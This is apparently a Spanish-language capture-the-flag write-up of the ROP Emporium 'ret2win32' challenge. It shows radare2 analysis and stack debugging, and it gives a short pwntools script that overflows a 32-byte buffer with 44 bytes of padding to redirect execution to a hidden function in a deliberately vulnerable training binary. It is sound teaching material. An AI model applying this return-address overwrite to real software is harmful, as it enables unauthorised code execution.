---
layout: post
title: Ret2Win32 - RopEmporium
tags: [ctf, ropemporium]
---

**Autor**: RopEmporium \\
**Challenge**: 1

![img](/imgs/write-ups/ropemporium/ret2win32/ret2win32.png#center)

## Introducción

Este desafío es algo diferente a las máquinas boot2root que suelo publicar. En este caso parto de un binario el cual hay que explotar, sobreescribiento la dirección de retorno (return address) para poder ejecutar un función que de otra forma no se podría.

En este desafío las herramientas principales que voy a usar son **Radare2** y **PwnTools**.

Desde el siguiente enlace de me descargo un zip con el binario y la bandera, **[ret2win](https://ropemporium.com/challenge/ret2win.html)**. En este writeup resuelvo la version **x86**.

## Información del binario

```
kali@kali:~/Desktop/ropemporium$ rabin2 -I ret2win32 
arch     x86
baddr    0x8048000
binsz    6206
bintype  elf
bits     32
canary   false
class    ELF32
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

Entre los datos a tener en cuenta vemos que **nx** está activado, por lo que el stack no es ejecutable. Esto ya lo sabiamos por que todos los desafios de **ropemporium** son así.

También compruebo que efectivamente su arquitectura es **x86**.

## Ejecución

Al ejecutar el binario me muestra un texto y luego me pide una entrada.

```
kali@kali:~/Desktop/ropemporium$ ./ret2win32  
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> LordP4
Thank you!

Exiting
```

Traducción.

```
Para mi primer truco, ¡intentaré meter 56 bytes de entrada de usuario en 32 bytes de buffer de pila!
¿Qué podría salir mal?
¿Me das tu opinión, por favor? Y no te preocupes por los bytes nulos, ¡estamos usando read()!
```

Con un bufferoverflow como este seguro que puedo sobreescribir la return address en el stack ;)

## Funciones

Abro el binario con radare2 para listar las funciones y echar un ojo como funciona.

```
kali@kali:~/Desktop/ropemporium$ r2 -d ret2win32    
glibc.fc_offset = 0x00148
[0xf7f48450]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0xf7f48450]>
```

Con el comando **afl** listo las funciones. En este caso me interesan 3.

```
[0xf7f48450]> afl
[...]
0x080485ad    1 127          sym.pwnme
[...]
0x0804862c    1 41           sym.ret2win
[...]
0x08048546    1 103          main
[...]
```

Importante anotar la dirección en la que se encuentra **ret2win**.

### Main

![img](/imgs/write-ups/ropemporium/ret2win32/main.png#center)

**1)** Se puede observar que en la función **main**, únicamente se llama a **pwnme** y que **ret2win** no aparece por ningún lado.

**2)** Me anoto esa dirección de memoria porque será la que buscaré en el stack para sobreescribirla.

### Pwnme

![img](/imgs/write-ups/ropemporium/ret2win32/pwnme.png#center)

Esta función no tiene mucha complejidad.

En las marcas **1** y **2** se ve que, efectivamente como dice el binario, intenta meter 56 bites de entrada del usuario en 32 bites asignado a la variable.

### ret2win

![img](/imgs/write-ups/ropemporium/ret2win32/ret2win.png#center)

Esta función es el objetivo al que tenemos que llegar. Su único propósito es leer el contenido de **flag.txt**.

## Debug

Voy a ejecutar el binario y comprobar como se almacenan los datos en el stack.

Coloco un breakpoint tras la ejecución de la función **pwnme**.

```
[0xf7f48450]> db 0x08048590
[...]
|           0x0804858b      e81d000000     call sym.pwnme
│           0x08048590 b    83ec0c         sub esp, 0xc
│           0x08048593      68fd860408     push str._nExiting          ; 0x80486fd ; "\nExiting"
│           0x08048598      e833feffff     call sym.imp.puts           ; int puts(const char *s)
[...]
```

### Stack

Ejecuto el programa, introducto una cadena y la busco en el stack.

![img](/imgs/write-ups/ropemporium/ret2win32/stack.png#center)

En el número **1** de color azul, se pueden ver los 32 bites reservados para la variable y en el número **2** de color verde, se puede ver la dirección de retorno que es la que queremos sobreescribir (anotada anteriormente).

Entre las dos direcciones hay una diferencia de 44 bites.

## Explotación

Para realizar la explotación, creo un script en python en el que utilizaré **pwntools**.

exploit.py

```python
from pwn import *

# Iniciar el proceso
p = process("./ret2win32")

# Padding inicial de 44 bites.
payload = b"A"*44

'''
Ambas opciones para envíar la dirección son válidas
'''
payload += p32(0x0804862c) # Dirección de ret2win
#payload += b"\x2c\x86\x04\x08"

p.recvuntil(">")
p.sendline(payload)

p.interactive()
```

En este script lo primero que hago es iniciar el binario, a continuación creo el payload, formado por 44 bites como padding inicial y seguido de la dirección de memoria de la función **ret2win**.

Despues utilizo la función "sendline" para envíar el payload e "interactive()" para mostrar los resultados en la terminal.

## Solución

Al ejecutarlo, obtenemos la bandera.

```
kali@kali:~/Desktop/ropemporium$ python3 exploit.py
[+] Starting local process './ret2win32': pid 68961
/home/kali/Desktop/ropemporium/exploit.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil(">")
[*] Switching to interactive mode
 Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

Y con esto termina mi solución. :)
